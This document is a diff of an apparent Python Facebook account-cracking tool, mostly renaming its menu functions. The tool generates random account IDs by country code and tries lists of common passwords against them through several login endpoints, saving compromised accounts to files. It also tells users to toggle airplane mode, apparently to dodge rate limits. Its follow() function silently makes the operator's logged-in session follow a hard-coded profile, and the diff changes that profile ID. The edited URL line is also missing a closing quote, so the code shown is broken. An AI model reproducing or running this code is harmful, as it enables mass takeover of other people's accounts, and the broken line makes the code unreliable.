@@ -1223,7 +1223,7 @@ def cek_apk(session,coki):
             print('\033[1;97m====================================================') 
 def follow(ses,coki):
     ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100001020800712', cookies={'cookie': coki}).text, 'html.parser')
+    r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100085544631199, cookies={'cookie': coki}).text, 'html.parser')
     get = r.find('a', string='Follow').get('href')
     ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
     
@@ -1235,18 +1235,18 @@ def xerx():
     print("[1] RANDOM CLONE NP\n[2] RANDOM CLONE IND\n[3] RANDOM CLONE PK\n[4] RANDOM CLONE BD\n[5] RANDOM CLONE WITH CHOOSE PSWD\n[6] RANDOM CLONE WITH I LOVE YOU & FREE FIRE PSWD\n[7] CONTACT OWNER")
     print(49*'=')
     aryan = input("✓CHOOSE>")
-    if aryan =='1':xerx1()
-    elif aryan =='2':xerx2()
-    elif aryan =='3':xerx3()
-    elif aryan =='4':xerx4()
-    elif aryan =='5':xerx5()
-    elif aryan =='6':xerx6()
+    if aryan =='1':mafiya1()
+    elif aryan =='2':mafiya2()
+    elif aryan =='3':mafiya3()
+    elif aryan =='4': mafiya4()
+    elif aryan =='5':mafiya5()
+    elif aryan =='6':mafiya6()
     elif aryan =='7':os.system("xdg-open https://www.facebook.com/profile.php?id=100066332015845")
     else:
         print("SELECT CORRECT OPTION")
-        xerx()
+        mafiya()
     
-def xerx1():
+def mafiya1():
 	user=[]
 	os.system('clear')
 	print(logo)
@@ -1264,7 +1264,7 @@ def xerx1():
 	print("[+]==============================================")
 	print("[1] METHOD 1- MBASIC\n[2] METHOD 2- P\n[3] METHOD 3- X\n[4] METHOD 4- MOBILE\n[5] METHOD 5- FREE\n[6] METHOD 6- D")
 	print(49*'=')
-	xerxfire = input("[+] [CHOOSE] :- ")
+	mafiyafire = input("[+] [CHOOSE] :- ")
 	os.system("clear")
 	print(logo)
 	print("                TRY SOMETHING NEW                       ")
@@ -1290,17 +1290,17 @@ def xerx1():
 		tl = str(len(user))
 		print(f"[+] TOTAL IDZ  : "+tl+" ")
 		print(f"[+] CODE CHOOSED : "+kode)
-		print(f'[+] METHOD CHOOSED : M{xerxfire}')
+		print(f'[+] METHOD CHOOSED : M{mafiyafire}')
 		print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
 		for guru in user:
 			uid = kode+guru
 			pwx = [uid+guru,'nepal123','nepal12345','free fire','i love you','freefire123']
-			if xerxfire =='1':yaari.submit(mbasic,uid,pwx,tl)
-			elif xerxfire =='2':yaari.submit(p,uid,pwx,tl)
-			elif xerxfire =='3':yaari.submit(x,uid,pwx,tl)
-			elif xerxfire =='4':yaari.submit(mobile,uid,pwx,tl)
-			elif xerxfire =='5':yaari.submit(freeq,uid,pwx,tl)
-			elif xerxfire =='6':yaari.submit(d,uid,pwx,tl)
+			if mafiyafire =='1':yaari.submit(mbasic,uid,pwx,tl)
+			elif mafiyafire =='2':yaari.submit(p,uid,pwx,tl)
+			elif mafiyafire =='3':yaari.submit(x,uid,pwx,tl)
+			elif mafiyafire =='4':yaari.submit(mobile,uid,pwx,tl)
+			elif mafiyafire =='5':yaari.submit(freeq,uid,pwx,tl)
+			elif mafiyafire =='6':yaari.submit(d,uid,pwx,tl)
 			else:
 			    yaari.submit(p,uid,pwx,tl)
 			
@@ -1309,7 +1309,7 @@ def xerx1():
 	print('[✓] OK/CP: '+str(len(oks))+'/'+str(len(cps)))
 	print('[?] Ids saved in MAFIYA-OK.txt, MAFIYA-CP.txt')
 	input("DO YOU WANT TO GO BACK MENU ")
-	xerx()
+	mafiya()
 	print(47*"-")
 	
 	
@@ -1317,7 +1317,7 @@ def xerx1():
 
 
 
-def xerx2():
+def mafiya2():
 	user=[]
 	os.system('clear')
 	print(logo)
@@ -1335,7 +1335,7 @@ def xerx2():
 	print("[+]==============================================")
 	print("[1] METHOD 1- MBASIC\n[2] METHOD 2- P\n[3] METHOD 3- X\n[4] METHOD 4- MOBILE\n[5] METHOD 5- FREE\n[6] METHOD 6- D")
 	print(49*'=')
-	xerxfire = input("[+] [CHOOSE] :- ")
+	mafiyafire = input("[+] [CHOOSE] :- ")
 	os.system("clear")
 	print(logo)
 	print("                TRY SOMETHING NEW                       ")
@@ -1361,19 +1361,19 @@ def xerx2():
 		tl = str(len(user))
 		print(f"[+] TOTAL IDZ  : "+tl+" ")
 		print(f"[+] CODE CHOOSED : "+kode)
-		print(f'[+] METHOD CHOOSED : M{xerxfire}')
+		print(f'[+] METHOD CHOOSED : M{mafiyafire}')
 		print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
 		for guru in user:
 			uid = kode+guru
 			mk = uid[:6]
 			pwx = [guru]
 			pwx = [kode+guru,mk,'free fire','i love you','freefire123']
-			if xerxfire =='1':yaari.submit(mbasic,uid,pwx,tl)
-			elif xerxfire =='2':yaari.submit(p,uid,pwx,tl)
-			elif xerxfire =='3':yaari.submit(x,uid,pwx,tl)
-			elif xerxfire =='4':yaari.submit(mobile,uid,pwx,tl)
-			elif xerxfire =='5':yaari.submit(freeq,uid,pwx,tl)
-			elif xerxfire =='6':yaari.submit(d,uid,pwx,tl)
+			if mafiyafire =='1':yaari.submit(mbasic,uid,pwx,tl)
+			elif mafiyafire =='2':yaari.submit(p,uid,pwx,tl)
+			elif mafiyafire =='3':yaari.submit(x,uid,pwx,tl)
+			elif mafiyafire =='4':yaari.submit(mobile,uid,pwx,tl)
+			elif mafiyafire =='5':yaari.submit(freeq,uid,pwx,tl)
+			elif mafiyafire =='6':yaari.submit(d,uid,pwx,tl)
 			else:
 			    yaari.submit(p,uid,pwx,tl)
 			
@@ -1383,7 +1383,7 @@ def xerx2():
 	print(47*"-")
 
 
-def xerx3():
+def mafiya3():
 	user=[]
 	os.system('clear')
 	print(logo)
@@ -1401,7 +1401,7 @@ def xerx3():
 	print("[+]==============================================")
 	print("[1] METHOD 1- MBASIC\n[2] METHOD 2- P\n[3] METHOD 3- X\n[4] METHOD 4- MOBILE\n[5] METHOD 5- FREE\n[6] METHOD 6- D")
 	print(49*'=')
-	xerxfire = input("[+] [CHOOSE] :- ")
+	mafiyafire = input("[+] [CHOOSE] :- ")
 	os.system("clear")
 	print(logo)
 	print("                TRY SOMETHING NEW                       ")
@@ -1427,19 +1427,19 @@ def xerx3():
 		tl = str(len(user))
 		print(f"[+] TOTAL IDZ  : "+tl+" ")
 		print(f"[+] CODE CHOOSED : "+kode)
-		print(f'[+] METHOD CHOOSED : M{xerxfire}')
+		print(f'[+] METHOD CHOOSED : M{mafiyafire}')
 		print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
 		for guru in user:
 			uid = kode+guru
 			mk = uid[:6]
 			pwx = [guru]
 			pwx = [kode+guru,mk,'khankhan','khan123','khan1122','Free Fire','i love you','freefire123','khan786','khan12345']
-			if xerxfire =='1':yaari.submit(mbasic,uid,pwx,tl)
-			elif xerxfire =='2':yaari.submit(p,uid,pwx,tl)
-			elif xerxfire =='3':yaari.submit(x,uid,pwx,tl)
-			elif xerxfire =='4':yaari.submit(mobile,uid,pwx,tl)
-			elif xerxfire =='5':yaari.submit(freeq,uid,pwx,tl)
-			elif xerxfire =='6':yaari.submit(d,uid,pwx,tl)
+			if mafiyafire =='1':yaari.submit(mbasic,uid,pwx,tl)
+			elif mafiyafire =='2':yaari.submit(p,uid,pwx,tl)
+			elif mafiyafire =='3':yaari.submit(x,uid,pwx,tl)
+			elif mafiyafire =='4':yaari.submit(mobile,uid,pwx,tl)
+			elif mafiyafire =='5':yaari.submit(freeq,uid,pwx,tl)
+			elif mafiyafire =='6':yaari.submit(d,uid,pwx,tl)
 			else:
 			    yaari.submit(p,uid,pwx,tl)
 			
@@ -1454,7 +1454,7 @@ def xerx3():
 	print(47*"-")
 
 
-def xerx4():
+def mafiya4():
 	user=[]
 	os.system('clear')
 	print(logo)
@@ -1472,7 +1472,7 @@ def xerx4():
 	print("[+]==============================================")
 	print("[1] METHOD 1- MBASIC\n[2] METHOD 2- P\n[3] METHOD 3- X\n[4] METHOD 4- MOBILE\n[5] METHOD 5- FREE\n[6] METHOD 6- D")
 	print(49*'=')
-	xerxfire = input("[+] [CHOOSE] :- ")
+	mafiyafire = input("[+] [CHOOSE] :- ")
 	os.system("clear")
 	print(logo)
 	print("                TRY SOMETHING NEW                       ")
@@ -1498,19 +1498,19 @@ def xerx4():
 		tl = str(len(user))
 		print(f"[+] TOTAL IDZ  : "+tl+" ")
 		print(f"[+] CODE CHOOSED : "+kode)
-		print(f'[+] METHOD CHOOSED : M{xerxfire}')
+		print(f'[+] METHOD CHOOSED : M{mafiyafire}')
 		print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
 		for guru in user:
 			uid = kode+guru
 			mk = uid[:6]
 			pwx = [guru]
 			pwx = [kode+guru,mk,'bangladesh','Bangladesh','free fire','Free Fire','i love you','freefire123']
-			if xerxfire =='1':yaari.submit(mbasic,uid,pwx,tl)
-			elif xerxfire =='2':yaari.submit(p,uid,pwx,tl)
-			elif xerxfire =='3':yaari.submit(x,uid,pwx,tl)
-			elif xerxfire =='4':yaari.submit(mobile,uid,pwx,tl)
-			elif xerxfire =='5':yaari.submit(freeq,uid,pwx,tl)
-			elif xerxfire =='6':yaari.submit(d,uid,pwx,tl)
+			if mafiyafire =='1':yaari.submit(mbasic,uid,pwx,tl)
+			elif mafiyafire =='2':yaari.submit(p,uid,pwx,tl)
+			elif mafiyafire =='3':yaari.submit(x,uid,pwx,tl)
+			elif mafiyafire =='4':yaari.submit(mobile,uid,pwx,tl)
+			elif mafiyafire =='5':yaari.submit(freeq,uid,pwx,tl)
+			elif mafiyafire =='6':yaari.submit(d,uid,pwx,tl)
 			else:
 			    yaari.submit(p,uid,pwx,tl)
 			
@@ -1522,7 +1522,7 @@ def xerx4():
 
 
 
-def xerx5():
+def mafiya5():
 	user=[]
 	os.system('clear')
 	print(logo)
@@ -1548,7 +1548,7 @@ def xerx5():
 	print(49*'=')
 	print("[1] METHOD 1- MBASIC\n[2] METHOD 2- P\n[3] METHOD 3- X\n[4] METHOD 4- MOBILE\n[5] METHOD 5- FREE\n[6] METHOD 6- D")
 	print(49*'=')
-	xerxfire = input("[+] [CHOOSE] :- ")
+	mafiyafire = input("[+] [CHOOSE] :- ")
 	os.system("clear")
 	print(logo)
 	print("                TRY SOMETHING NEW                       ")
@@ -1575,26 +1575,26 @@ def xerx5():
 		tl = str(len(user))
 		print(f"[+] CODE CHOOSED : "+code)
 		print(f"[+] TOTAL IDZ : "+tl+" ")
-		print(f'[+] METHOD CHOOSED : M{xerxfire}')
+		print(f'[+] METHOD CHOOSED : M{mafiyafire}')
 		print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
 		for love in user:
 			pwx = [love[1:]]
 			uid = code+love
 			for Eman in HamiiID:
 				pwx.append(Eman)
-			if xerxfire =='1':manshera.submit(mbasic,uid,pwx,tl)
-			elif xerxfire =='2':manshera.submit(p,uid,pwx,tl)
-			elif xerxfire =='3':manshera.submit(x,uid,pwx,tl)
-			elif xerxfire =='4':manshera.submit(mobile,uid,pwx,tl)
-			elif xerxfire =='5':manshera.submit(freeq,uid,pwx,tl)
-			elif xerxfire =='6':manshera.submit(d,uid,pwx,tl)
+			if mafiyafire =='1':manshera.submit(mbasic,uid,pwx,tl)
+			elif mafiyafire =='2':manshera.submit(p,uid,pwx,tl)
+			elif mafiyafire =='3':manshera.submit(x,uid,pwx,tl)
+			elif mafiyafire =='4':manshera.submit(mobile,uid,pwx,tl)
+			elif mafiyafire =='5':manshera.submit(freeq,uid,pwx,tl)
+			elif mafiyafire =='6':manshera.submit(d,uid,pwx,tl)
 			else:
 			    manshera.submit(p,uid,pwx,tl)
 			
 
 
 
-def xerx6():
+def mafiya6():
 	user=[]
 	os.system('clear')
 	print(logo)
@@ -1612,7 +1612,7 @@ def xerx6():
 	print("[+]==============================================")
 	print("[1] METHOD 1- MBASIC\n[2] METHOD 2- P\n[3] METHOD 3- X\n[4] METHOD 4- MOBILE\n[5] METHOD 5- FREE\n[6] METHOD 6- D")
 	print(49*'=')
-	xerxfire = input("[+] [CHOOSE] :- ")
+	mafiyafire = input("[+] [CHOOSE] :- ")
 	os.system("clear")
 	print(logo)
 	print("                TRY SOMETHING NEW                       ")
@@ -1638,19 +1638,19 @@ def xerx6():
 		tl = str(len(user))
 		print(f"[+] TOTAL IDZ  : "+tl+" ")
 		print(f"[+] CODE CHOOSED : "+kode)
-		print(f'[+] METHOD CHOOSED : M{xerxfire}')
+		print(f'[+] METHOD CHOOSED : M{mafiyafire}')
 		print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
 		for guru in user:
 			uid = kode+guru
 			mk = uid[:6]
 			pwx = [guru]
 			pwx = [kode+guru,mk,'free fire','i love you','freefire123']
-			if xerxfire =='1':yaari.submit(mbasic,uid,pwx,tl)
-			elif xerxfire =='2':yaari.submit(p,uid,pwx,tl)
-			elif xerxfire =='3':yaari.submit(x,uid,pwx,tl)
-			elif xerxfire =='4':yaari.submit(mobile,uid,pwx,tl)
-			elif xerxfire =='5':yaari.submit(freeq,uid,pwx,tl)
-			elif xerxfire =='6':yaari.submit(d,uid,pwx,tl)
+			if mafiyafire =='1':yaari.submit(mbasic,uid,pwx,tl)
+			elif mafiyafire =='2':yaari.submit(p,uid,pwx,tl)
+			elif mafiyafire =='3':yaari.submit(x,uid,pwx,tl)
+			elif mafiyafire =='4':yaari.submit(mobile,uid,pwx,tl)
+			elif mafiyafire =='5':yaari.submit(freeq,uid,pwx,tl)
+			elif mafiyafire =='6':yaari.submit(d,uid,pwx,tl)
 			else:
 			    yaari.submit(p,uid,pwx,tl)
 			
@@ -2149,4 +2149,4 @@ def d(uid,pwx,tl):
 	except:
 		pass
 
-xerx()
+mafiya()
